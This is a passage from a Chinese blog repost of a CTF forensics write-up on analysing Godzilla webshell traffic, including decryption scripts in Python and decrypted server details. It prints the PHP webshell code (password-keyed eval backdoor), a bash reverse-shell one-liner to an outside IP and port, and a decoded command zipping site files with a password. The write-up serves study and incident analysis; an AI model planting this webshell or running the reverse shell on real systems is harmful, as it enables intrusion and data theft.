class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$pass=&#x27;oL@ns!@opaOiw&#x27;;</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;6cfcfe9b99c68a0a&#x27;;</span><br><span class="line">if (isset($_POST[$pass]))&#123;</span><br><span class="line">    $data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class="line">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class="line">        $payload=encode($_SESSION[$payloadName],$key);</span><br><span class="line">        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;</span><br><span class="line">            $payload=encode($payload,$key);</span><br><span class="line">        &#125;</span><br><span class="line">  eval($payload);</span><br><span class="line">        echo substr(md5($pass.$key),0,16);</span><br><span class="line">        echo base64_encode(encode(@run($data),$key));</span><br><span class="line">        echo substr(md5($pass.$key),16);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class="line">            $_SESSION[$payloadName]=encode($data,$key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">import gzip</span><br><span class="line">def dec(c,key):</span><br><span class="line"> p=&quot;&quot;</span><br><span class="line"> for i in range(len(c)):</span><br><span class="line">  p += chr(ord(c[i])^ord(key[(i+1)&amp;15]))</span><br><span class="line"> return p</span><br><span class="line"></span><br><span class="line">cipher = b&quot;&quot;</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">gg = dec(b64decode(cipher).decode(&quot;latin1&quot;),&quot;6cfcfe9b99c68a0a&quot;)</span><br><span class="line">print(gzip.decompress(gg.encode(&quot;latin1&quot;)).decode())</span><br><span class="line">import gzip</span><br><span class="line">def dec(c,key):</span><br><span class="line"> p=&quot;&quot;</span><br><span class="line"> for i in range(len(c)):</span><br><span class="line">  p += chr(ord(c[i])^ord(key[(i+1)&amp;15]))</span><br><span class="line"> return p</span><br><span class="line"></span><br><span class="line">cipher = b&quot;fO1rZmU5Yjk5YEtsqkLCDne7iE3No89VJx0yixLpBdTJXjOGqU2tfxwj7qInvyAUEtT7CfoSDh7QJvm6I8f9zfNoJAIDHjncHL0Vr6LpypsL2oZS/z/xYA1aBPEbbhqJrsQcRaXfsUnLPzvqb27Y+d7aK7UYR0Li1izdxQ/TvMG/PWwhSrXfCXGFdyqvjIb1pe3fFdkdqQDjb0v3xU1XmuTvzMnKkSrO4EIT04yGYZIOpCZUytFAYOnLfPpBuPIey/ULs9NwqS9Oaju72mswqHZhS/yobzO1J22xpB0Tlm+Sgdm+w2LVw3ykQCnm+VNqssJp8dadPH9O9MT1gh4cDPM7bePNdekG64HJTtc8y2Ox0LMEdPxOMN7I0G5kSsVmBpMRfCn6C5T97o9VWzp2RbcWIM3rqBSpjIZ8IlYIsnrx7HmwFZ5wi2XTQR14nJJU4P7PM4Y7pvevKjVdhaKItcNYK52nQz2mjXyxRqabEM/yDB/PQzTJv9onHAEYhwckZjd7yucx+w5a+ubvB2YJKRI/FCWmscTPPYMCebpckooUTHY/E4FvvJ40/MKCmR2dHls3e8ponKmqEavX/bA7ermcqyFpvUpO4HD2Cckjv7uDaPnw3ob+VwipTW1SU7dLjoD9p14XRxJWJXMN9Cu7Q9zZENsAbif7lgscBzEz/Kov9Ok3oL7edfIRgcVBPBzPW4WshuzzxCLkucS2+H9z2GaLm52yNXIjNCMmFlhBiOEaNWQoZH3gMOzcp7ZqXrz4wR7sYLgQuCl4rFW14K4hG+Fbsay9KJ27gPOrYVwI2iYEa0PkdN8wNs9lGzu1gPc4/kMls1rh52m63kbajPh6geBGa0e1WnK+yrrU3rIC2gmjKynJ+QUQQM+gH8RkcoUAr3yRD09xupGngrBi5/ESUbIHZlBTn6GDP6HK6xD7B85+Lj+zZ52kjESwOu8i74Bwamrk0cn+z+zBu9Yb0iab1XBTRKoOHD0JrtX1R3oV0J7vi9pahwsd/e5MNEt9X01KbbxUPtn4LuDZH61ZvBhT8ICM0XH5pgq2eAFI/mRbWgA9pih/ot9Grf9GIYIC75cGJzfuSScjGg5Fcy6WqrsANDiT4C+de19P/uWRX0H/eYuVuv5vCQYYJrpOpwHI7nORbdeXjhsrn/kpVuy9L/n3QOVHID0j/af4LofMy71Ov8M8O9gdlWhjvfIgyTmAE3+PgmNjZg==&quot;</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">gg = dec(b64decode(cipher).decode(&quot;latin1&quot;),&quot;6cfcfe9b99c68a0a&quot;)</span><br><span class="line">print(gzip.decompress(gg.encode(&quot;latin1&quot;)).decode())</span><br><span class="line">OsInfo : Linux ctmd 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64</span><br><span class="line">CurrentUser : www</span><br><span class="line">REMOTE_ADDR : fd15:</span><br><span class="line">4ba5:</span><br><span class="line">5a2b:</span><br><span class="line">1008:</span><br><span class="line">20c:</span><br><span class="line">29ff:</span><br><span class="line">fe57:</span><br><span class="line">a107</span><br><span class="line">REMOTE_PORT : 33928</span><br><span class="line">HTTP_X_FORWARDED_FOR : fd15:</span><br><span class="line">4ba5:</span><br><span class="line">5a2b:</span><br><span class="line">1008:</span><br><span class="line">f581:</span><br><span class="line">619a:</span><br><span class="line">b163:</span><br><span class="line">c627</span><br><span class="line">HTTP_CLIENT_IP : </span><br><span class="line">SERVER_ADDR : fd15:</span><br><span class="line">4ba5:</span><br><span class="line">5a2b:</span><br><span class="line">1008:</span><br><span class="line">60b9:</span><br><span class="line">ff63:</span><br><span class="line">528e:</span><br><span class="line">149d</span><br><span class="line">SERVER_NAME : tp6.0.1.com</span><br><span class="line">SERVER_PORT : 32154</span><br><span class="line">disable_functions : </span><br><span class="line">Open_basedir : </span><br><span class="line">timezone : PRC</span><br><span class="line">encode : </span><br><span class="line">extension_dir : /www/server/php/81/lib/php/extensions/no-debug-non-zts-20210902</span><br><span class="line">systempdir : /tmp/</span><br><span class="line">include_path : .:</span><br><span class="line">DOCUMENT_ROOT : /www/wwwroot/32154/tp/public</span><br><span class="line">PHP_SAPI : fpm-fcgi</span><br><span class="line">PHP_VERSION : 8.1.17</span><br><span class="line">PHP_INT_SIZE : 8</span><br><span class="line">ProcessArch : x64</span><br><span class="line">PHP_OS : Linux</span><br><span class="line">canCallGzipDecode : 1</span><br><span class="line">canCallGzipEncode : 1</span><br><span class="line">session_name : PHPSESSID</span><br><span class="line">session_save_path : </span><br><span class="line">session_save_handler : files</span><br><span class="line">session_serialize_handler : php</span><br><span class="line">user_ini_filename : .user.ini</span><br><span class="line">memory_limit : 128M</span><br><span class="line">upload_max_filesize : 50M</span><br><span class="line">post_max_size : 50M</span><br><span class="line">max_execution_time : 0</span><br><span class="line">max_input_time : 60</span><br><span class="line">default_socket_timeout : 60</span><br><span class="line">mygid : 1001</span><br><span class="line">mypid : 81435</span><br><span class="line">SERVER_SOFTWAREypid : nginx/1.22.1</span><br><span class="line">loaded_extensions : Core,date,libxml,openssl,pcre,sqlite3,zlib,bcmath,ctype,curl,dom,filter,ftp,gd,gettext,hash,iconv,intl,json,mbstring,SPL,session,pcntl,standard,mysqlnd,PDO,pdo_mysql,pdo_sqlite,Phar,posix,Reflection,mysqli,shmop,SimpleXML,soap,sockets,sodium,sysvsem,tokenizer,xml,xmlreader,xmlwriter,cgi-fcgi,zip</span><br><span class="line">short_open_tag : true</span><br><span class="line">asp_tags : false</span><br><span class="line">safe_mode : false</span><br><span class="line">CurrentDir : /www/wwwroot/32154/tp/public</span><br><span class="line">FileRoot : /</span><br><span class="line">&lt;?php    </span><br><span class="line">function customEncrypt($data, $key) &#123;</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $iv = random_bytes(16);</span><br><span class="line">    $encryptedData = openssl_encrypt($data, &#x27;aes-256-cbc&#x27;, $key, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $result = base64_encode($iv . $encryptedData);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">cc = b64decode(&quot;jiVOhckW3Dp9ePlm2iuyBWBHWNlDxWbTlAqPt+JLIa8s3+vJZlcVIHKETqbIknErPCkevvm3heHFI5Vc5W8Wby8+W+6hfhjM/i0XyxsbIZVj5QyHQ4isWlekCszQlevGH8SlxjvfIRcbMxdUXREI/EWGiZKdFL81U80x7V9em+MJ4KsScq0bgnJ98yq1nMcl&quot;)</span><br><span class="line"></span><br><span class="line">c = cc[16:]</span><br><span class="line">iv = cc[:16]</span><br><span class="line">key = b&#x27;a5a74e2ab431761ecb2299ef88d46a38&#x27;</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)</span><br><span class="line">print(enc.decrypt(c))</span><br><span class="line">import gzip</span><br><span class="line">def dec(c,key):</span><br><span class="line"> p=&quot;&quot;</span><br><span class="line"> for i in range(len(c)):</span><br><span class="line">  p += chr(ord(c[i])^ord(key[(i+1)&amp;15]))</span><br><span class="line"> return p</span><br><span class="line"></span><br><span class="line">cipher = b&quot;fO1rZmU5Yjk5YGVutX+r+rApKUqr2WAoM9n/MouZdJ+qbHM4w7v4pEcpXKEfeRO33cfC7/uQ/Jin8peZ37nwh/LH4ev/mFg5tEnbaCIwYTY=&quot;</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">gg = dec(b64decode(cipher).decode(&quot;latin1&quot;),&quot;6cfcfe9b99c68a0a&quot;)</span><br><span class="line">print(gzip.decompress(gg.encode(&quot;latin1&quot;)).decode())</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/114.5.1.211/42321 &lt;&amp;1&#x27;</span><br><span class="line">from base64 import *</span><br><span class="line">from hashlib import md5</span><br><span class="line">cc = b64decode(&quot;4Q77JutsR+DCTQEDptU6aUvtVVu5h+F+mIHcSE3jJl9hnjPSnBapKdxNNJ3i0Qgr&quot;)</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">c = cc[16:]</span><br><span class="line">iv = cc[:16]</span><br><span class="line">for i in range(1048575):</span><br><span class="line"> key = md5(hex(i)[2:].rjust(5,&#x27;0&#x27;).encode()).hexdigest().encode()</span><br><span class="line">    #key = b&#x27;a5a74e2ab431761ecb2299ef88d46a38&#x27;</span><br><span class="line">    #key = b&#x27;1d77b220bdf94d38007e3e6e9c380588&#x27;</span><br><span class="line"> enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)</span><br><span class="line"> res = enc.decrypt(c)</span><br><span class="line"> if res[-1]==res[-2]==res[-3]:</span><br><span class="line">  print(res,hex(i))</span><br><span class="line">from base64 import *</span><br><span class="line">from hashlib import md5</span><br><span class="line">cc = b64decode(&quot;WsclGnueTdLgsUSeNeoqvUouMsABv70pjjt+0cUFsLQMlEkgUVXIZV4cyshI0Z5aGXQ4ZNefWX37rbR88Im2Qp5j08fnwXj9st8vV2cdhfODV24X0iL5V5aR0pB+eRiNE+oDRLAQBxR2UBcnjCk/inupvIHpSzD9Ug1GhtFGdMW/SeF0+s6LCaeRSqvoggeF&quot;)</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">c = cc[16:]</span><br><span class="line">iv = cc[:16]</span><br><span class="line">key = b&#x27;1d77b220bdf94d38007e3e6e9c380588&#x27;</span><br><span class="line">enc = AES.new(iv=iv,key=key,mode=AES.MODE_CBC)</span><br><span class="line">res = enc.decrypt(c)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"># b&#x27;system(&quot;zip -q -r -P &quot;MS1209D@IOEJabnsdIUJEOI@&quot; /www/wwwroot/32154/tp/public/version.zip /www/wwwroot/32154/tp/composer.json&quot;);x01&#x27;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/142203.html](https://www.ctfiot.com/142203.html)
+> 仓库原文：[CTF大赛WP集合/articles/2023_江苏省数据安全竞赛_决赛.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2023_%E6%B1%9F%E8%8B%8F%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_%E5%86%B3%E8%B5%9B.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%93%A5%E6%96%AF%E6%8B%89webshell/">哥斯拉webshell</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/%E5%8F%96%E8%AF%81/2023_%E5%B9%B4%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%B8%88-%E5%86%B3%E8%B5%9BWP/" title="2023 年全国网络安全行业职业技能大赛 - 电子数据取证分析师 - 决赛 WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023 年全国网络安全行业职业技能大赛 - 电子数据取证分析师 - 决赛 WP</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/%E5%8F%96%E8%AF%81/2023%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E9%B9%8F%E5%9F%8E%E9%94%A6%E6%A0%87%E8%B5%9BWriteUp/" title="2023 工业信息安全技能大赛鹏城锦标赛 WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023 工业信息安全技能大赛鹏城锦标赛 WriteUp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
